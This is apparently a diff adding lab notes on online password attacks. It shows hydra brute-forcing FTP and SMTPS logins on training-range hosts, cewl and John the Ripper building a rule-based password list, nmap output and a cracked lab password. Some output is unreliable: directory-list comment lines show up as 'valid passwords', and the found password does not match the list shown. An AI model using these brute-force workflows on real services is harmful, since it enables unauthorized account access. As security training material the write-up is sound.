@@ -1066,3 +1066,233 @@ ftp> ^D
 THM{d0abe799f25738ad739c20301aed357b}
 
 ```
+
+## Online Password Attacks
+
+Online password attacks involve guessing passwords for networked services that use a username and password authentication scheme, including services such as HTTP, SSH, VNC, FTP, SNMP, POP3, etc. This section showcases using hydra which is a common tool used in attacking logins for various network services.
+Hydra
+
+Hydra supports an extensive list of network services to attack. Using hydra, we'll brute-force network services such as web login pages, FTP, SMTP, and SSH in this section. Often, within hydra, each service has its own options and the syntax hydra expects takes getting used to. It's important to check the help options for more information and features.
+
+**FTP**
+```bash
+user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
+
+"
+-l ftp we are specifying a single username, use-L for a username wordlist
+-P Path specifying the full path of wordlist, you can specify a single password by using -p.
+ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.
+"
+```
+
+-l ftp we are specifying a single username, use-L for a username wordlist
+
+-P Path specifying the full path of wordlist, you can specify a single password by using -p.
+
+ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.
+
+
+```bash
+dir_wordlist=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+rhost=10.10.131.9
+password=/usr/share/wordlists/rockyou.txt
+hydra -l ftp -P $password ftp://$rhost
+```
+
+test
+```
+[DATA] attacking ftp://10.10.131.9:21/
+[21][ftp] host: 10.10.131.9   login: ftp   password: # on at least 2 different hosts
+[21][ftp] host: 10.10.131.9   login: ftp   password: # directory-list-2.3-medium.txt
+[21][ftp] host: 10.10.131.9   login: ftp   password: #
+[21][ftp] host: 10.10.131.9   login: ftp   password: # Copyright 2007 James Fisher
+[21][ftp] host: 10.10.131.9   login: ftp   password: #
+[21][ftp] host: 10.10.131.9   login: ftp   password: # This work is licensed under the Creative Commons
+[21][ftp] host: 10.10.131.9   login: ftp   password: # Attribution-Share Alike 3.0 License. To view a copy of this                                                                
+[21][ftp] host: 10.10.131.9   login: ftp   password: # license, visit http://creativecommons.org/licenses/by-sa/3.0/                                                              
+[21][ftp] host: 10.10.131.9   login: ftp   password: # or send a letter to Creative Commons, 171 Second Street,                                                                   
+[21][ftp] host: 10.10.131.9   login: ftp   password: # Suite 300, San Francisco, California, 94105, USA.                                                                          
+[21][ftp] host: 10.10.131.9   login: ftp   password: #
+[21][ftp] host: 10.10.131.9   login: ftp   password: # Priority ordered case-sensitive list, where entries were found                                                             
+[21][ftp] host: 10.10.131.9   login: ftp   password: #
+[21][ftp] host: 10.10.131.9   login: ftp
+[21][ftp] host: 10.10.131.9   login: ftp   password: index
+[21][ftp] host: 10.10.131.9   login: ftp   password: images
+1 of 1 target successfully completed, 16 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-22 09:36:16
+
+```
+
+**SMTP**
+Similar to FTP servers, we can also brute-force SMTP servers using hydra. The syntax is similar to the previous example. The only difference is the targeted protocol. Keep in mind, if you want to try other online password attack tools, you may need to specify the port number, which is 25. Make sure to read the help options of the tool.
+
+```bash
+hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
+
+```
+
+**TASKS**
+In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against 10.10.131.9:465 (SMTPS).
+
+**RECON**
+```bash
+
+Nmap scan report for ip-10-10-208-218.eu-west-1.compute.internal (10.10.208.218)
+Host is up, received arp-response (0.0016s latency).
+Scanned at 2024-01-22 12:28:42 UTC for 20s
+Not shown: 994 closed tcp ports (reset)
+PORT    STATE SERVICE  REASON         VERSION
+21/tcp  open  ftp      syn-ack ttl 64 vsftpd 3.0.3
+22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+25/tcp  open  smtp     syn-ack ttl 63 Postfix smtpd
+80/tcp  open  http     syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+465/tcp open  ssl/smtp syn-ack ttl 63 Postfix smtpd
+587/tcp open  smtp     syn-ack ttl 63 Postfix smtpd
+MAC Address: 02:4C:22:73:3A:6D (Unknown)
+Service Info: Host: mail.thm.labs; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+What is the password? Note that the password format is as follows: [symbol][dictionary word][0-9][0-9].
+
+
+
+```bash
+#Get custom clinc wordlist:
+cewl https://clinic.thmredteam.com/ -m 8 -w clinic_wordlist.txt
+
+
+vi /opt/john/john.conf
+"
+[List.Rules:THM-Password-Attacks]
+Az"[0–9][0–9]" ^[!@]
+"
+
+cp /opt/john/john.conf /etc/john/john.conf
+/sbin/john --wordlist=clinic_wordlist.txt --rules=THM-Password-Attacks --stdout > dict.lst
+
+Press 'q' or Ctrl-C to abort, almost any other key for status
+5250p 0:00:00:00 100.00% (2024-01-22 09:55) 525000p/s @ultricies99
+```
+
+cewl list
+```
+placerat
+venenatis
+eleifend
+Technology
+Consultant
+thmredteam
+Professional
+interdum
+condimentum
+pellentesque
+fringilla
+volutpat
+tincidunt
+Maecenas
+lobortis
+facilisis
+pulvinar
+dignissim
+Suspendisse
+Facebook
+maecenas
+voluptate
+Introducing
+Categories
+pharetra
+Curabitur
+consequat
+ultricies
+```
+
+generated list 
+```
+...
+ 5221  @Vestibulum99
+  5222  @vehicula99
+  5223  @placerat99
+  5224  @venenatis99
+  5225  @eleifend99
+  5226  @Technology99
+  5227  @Consultant99
+  5228  @thmredteam99
+  5229  @Professional99
+  5230  @interdum99
+  5231  @condimentum99
+  5232  @pellentesque99
+  5233  @fringilla99
+  5234  @volutpat99
+  5235  @tincidunt99
+  5236  @Maecenas99
+  5237  @lobortis99
+  5238  @facilisis99
+  5239  @pulvinar99
+  5240  @dignissim99
+  5241  @Suspendisse99
+  5242  @Facebook99
+  5243  @maecenas99
+  5244  @voluptate99
+  5245  @Introducing99
+  5246  @Categories99
+  5247  @pharetra99
+  5248  @Curabitur99
+  5249  @consequat99
+  5250  @ultricies99
+
+```
+
+then attack stmp using the wordlist
+```bash
+wordlist=dict.lst
+rhost=10.10.208.218
+user=pittman@clinic.thmredteam.com
+hydra -l $user -P $wordlist smtps://$rhost -s 465 -v
+
+
++ wordlist=dict.lst
++ rhost=10.10.208.218
++ user=pittman@clinic.thmredteam.com
++ hydra -l pittman@clinic.thmredteam.com -P dict.lst smtps://10.10.208.218 -s 465 -v -t 4 -T 4
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-22 12:41:46
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 5250 login tries (l:1/p:5250), ~1313 tries per task
+[DATA] attacking smtps://10.10.208.218:465/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[465][smtp] host: 10.10.208.218   login: pittman@clinic.thmredteam.com   password: !multidisciplinary00                                                                           
+[STATUS] attack finished for 10.10.208.218 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-22 12:42:44
+
+```
